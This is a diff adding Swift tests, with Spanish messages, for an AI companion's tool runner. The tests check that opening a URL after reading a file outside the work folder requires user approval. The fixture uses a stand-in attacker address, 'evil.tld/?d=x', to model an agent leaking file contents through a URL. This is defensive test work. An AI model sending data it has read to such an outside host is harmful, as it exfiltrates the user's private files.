@@ -1,6 +1,7 @@
 import CompanionCore
 import CompanionCoreTestSupport
 import CompanionServices
+import CompanionServicesTestSupport
 import CompanionTestKit
 import Foundation
 import Testing
@@ -70,4 +71,45 @@ func aFetchAfterReadingInsideTheWorkFolderOrAloneDoesNotAsk() async throws {
     expectEq(inside.approvals, 0, "leer dentro de la carpeta no contamina el turno")
     let alone = try await run(readPath: nil, workdir: work)
     expectEq(alone.approvals, 0, "un fetch en un turno limpio no pregunta")
+}
+
+// The chat and voice lane: the parent has no web_fetch, its way out of the Mac is open_url.
+
+@MainActor
+private func chatRunner(work: String) -> ParentToolRunner {
+    ParentToolRunner(workspace: FakeWorkspaceOpener(), workdir: work)
+}
+
+private func openCall(_ url: String) -> ToolCallRef {
+    ToolCallRef(id: "o", name: "open_url", arguments: "{\"url\":\"\(url)\"}")
+}
+
+@Test(.timeLimit(.minutes(1))) @MainActor
+func inTheChatAnAddressAfterAReadOutsideTheWorkFolderAsksUnlessTheUserSaidIt() async throws {
+    let work = taintDir("chat-work").path
+    let elsewhere = taintDir("chat-else").path
+    defer {
+        do { try FileManager.default.removeItem(atPath: work) } catch {}
+        do { try FileManager.default.removeItem(atPath: elsewhere) } catch {}
+    }
+    try "secreto".write(toFile: elsewhere + "/a.txt", atomically: true, encoding: .utf8)
+    let tools = chatRunner(work: work)
+    let call = openCall("https://evil.tld/?d=x")
+    expect(tools.approval(for: call, said: "") == nil, "turno limpio: una dirección corta no pregunta")
+    let read = await tools.execute(name: "read_file", argumentsJSON: "{\"path\":\"\(elsewhere)/a.txt\"}")
+    expect(read.ok, "la lectura corre sin hoja: \(read.output)")
+    expect(tools.approval(for: call, said: "") != nil, "leyó fuera y luego una dirección: pide")
+    expect(tools.approval(for: call, said: "abre evil.tld") == nil, "el host lo dijo la usuaria: no pide")
+    tools.beginTurn()
+    expect(tools.approval(for: call, said: "") == nil, "otro turno: la marca se reinicia")
+}
+
+@Test(.timeLimit(.minutes(1))) @MainActor
+func inTheChatReadingInsideTheWorkFolderLeavesTheTurnClean() async throws {
+    let work = taintDir("chat-clean").path
+    defer { do { try FileManager.default.removeItem(atPath: work) } catch {} }
+    try "nota".write(toFile: work + "/a.txt", atomically: true, encoding: .utf8)
+    let tools = chatRunner(work: work)
+    _ = await tools.execute(name: "read_file", argumentsJSON: "{\"path\":\"\(work)/a.txt\"}")
+    expect(tools.approval(for: openCall("https://evil.tld/?d=x"), said: "") == nil, "leer dentro no contamina")
 }
